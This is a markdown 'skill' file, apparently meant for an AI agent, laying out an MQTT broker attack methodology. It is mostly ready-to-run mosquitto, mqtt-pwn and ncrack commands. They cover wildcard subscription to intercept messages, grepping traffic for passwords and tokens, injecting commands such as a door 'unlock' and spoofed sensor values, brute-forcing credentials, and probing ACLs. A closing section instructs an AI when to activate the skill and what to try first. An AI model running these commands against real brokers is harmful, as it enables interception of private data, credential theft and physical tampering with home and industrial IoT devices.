# MQTT Pentesting Skill

## Goal

Exploit MQTT (Message Queuing Telemetry Transport) brokers to intercept messages, extract sensitive data, and inject malicious messages.

## Methodology

1. **Discovery**: Identify MQTT brokers
2. **Authentication Check**: Test for anonymous access
3. **Topic Enumeration**: Subscribe to wildcard topics
4. **Message Interception**: Capture sensitive messages
5. **Message Injection**: Publish malicious messages

## Ports

- 1883/TCP: MQTT (unencrypted)
- 8883/TCP: MQTT/TLS (encrypted)

## Background

MQTT is used in IoT, home automation, and industrial systems:
- Publish/subscribe messaging model
- Topics are hierarchical paths (home/sensors/temperature)
- Often lacks authentication
- Wildcards: # (multi-level), + (single-level)

## Tools

* **mosquitto_sub/pub**: Mosquitto CLI clients
* **mqtt-spy**: GUI MQTT client
* **mqtt-pwn**: MQTT penetration testing framework
* **nmap**: MQTT scripts

## Example Commands

```bash
# Check for MQTT service
nmap -p1883,8883 --script mqtt-subscribe target

# Test anonymous connection
mosquitto_sub -h target -t '#' -v

# With credentials
mosquitto_sub -h target -u user -P password -t '#' -v

# Check connection
mosquitto_pub -h target -t "test/connection" -m "hello"
```

## Anonymous Access Check

```bash
# Subscribe to all topics (wildcard)
mosquitto_sub -h target -t '#' -v

# If successful, no authentication required!

# Subscribe to specific topic levels
mosquitto_sub -h target -t '+/+' -v
mosquitto_sub -h target -t 'home/#' -v
mosquitto_sub -h target -t 'sensors/+/temperature' -v
```

## Topic Enumeration

```bash
# Using mqtt-pwn
./mqtt-pwn
> connect -h target
> discovery -t '#'
> scan

# Subscribe to system topics
mosquitto_sub -h target -t '$SYS/#' -v

# Common system topics:
# $SYS/broker/version
# $SYS/broker/clients/connected
# $SYS/broker/messages/sent
# $SYS/broker/uptime

# Enumerate common IoT topic patterns
for topic in home sensors devices status control command config; do
    mosquitto_sub -h target -t "$topic/#" -v -W 5
done
```

## Message Interception

```bash
# Capture all messages
mosquitto_sub -h target -t '#' -v | tee mqtt_capture.txt

# Filter for interesting data
mosquitto_sub -h target -t '#' -v | grep -i "password\|credential\|key\|token"

# Monitor specific device
mosquitto_sub -h target -t 'devices/+/data' -v

# Using mqtt-spy for analysis
# Graphical interface for message analysis
```

## Message Injection

```bash
# Publish to a topic
mosquitto_pub -h target -t "topic/path" -m "message"

# Retain message (persists on broker)
mosquitto_pub -h target -t "topic/path" -m "message" -r

# Control IoT devices
mosquitto_pub -h target -t "home/door/command" -m "unlock"
mosquitto_pub -h target -t "devices/light/set" -m "on"

# Inject sensor data
mosquitto_pub -h target -t "sensors/temperature" -m "999"

# Spoof device identity
mosquitto_pub -h target -t "devices/trusted-device/status" -m "normal"
```

## Brute Force

```bash
# Using mqtt-pwn
./mqtt-pwn
> connect -h target
> brute -u users.txt -p passwords.txt

# Using Ncrack
ncrack -p1883 --user admin -P /usr/share/wordlists/rockyou.txt target

# Using custom script
for user in admin root mqtt; do
    for pass in $(cat wordlist.txt); do
        mosquitto_sub -h target -u "$user" -P "$pass" -t '$SYS/broker/version' -W 2 && echo "Found: $user:$pass"
    done
done
```

## ACL Bypass Testing

```bash
# Even with authentication, ACLs may be misconfigured

# Try subscribing to restricted topics
mosquitto_sub -h target -u user -P pass -t 'admin/#' -v
mosquitto_sub -h target -u user -P pass -t 'internal/#' -v

# Try publishing to restricted topics
mosquitto_pub -h target -u user -P pass -t 'admin/config' -m 'test'
```

## Common IoT Topic Patterns

```bash
# Home automation
home/+/status
home/+/control
sensors/+/+
lights/+/state
door/+/lock

# Industrial
factory/+/plc/#
machines/+/status
production/line/#
control/+/setpoint

# Generic IoT
devices/+/telemetry
+/+/heartbeat
system/status
config/+
commands/+
```

## Metasploit Modules

```bash
# There's no built-in module, but custom scripts work

# mqtt-pwn is comprehensive:
git clone https://github.com/akamai-threat-research/mqtt-pwn
cd mqtt-pwn
./mqtt-pwn
```

## Guidance for AI

* Activate this skill when user wants to test MQTT broker security or IoT messaging
* **MQTT often has no authentication** - try anonymous subscribe first
* Use `#` wildcard to receive ALL messages: `mosquitto_sub -h target -t '#' -v`
* `$SYS/#` topics reveal broker information
* Common in:
  - Smart home systems
  - Industrial IoT (IIoT)
  - Fleet management
  - Sensor networks
* Messages may contain:
  - Sensor readings
  - Device commands
  - User data
  - Authentication tokens
  - Configuration data
* Message injection can cause physical effects in IoT systems
* QoS levels and retained messages may hold old sensitive data
* TLS (port 8883) encrypts traffic but may still allow anonymous access
* Check for ACL bypass after authentication
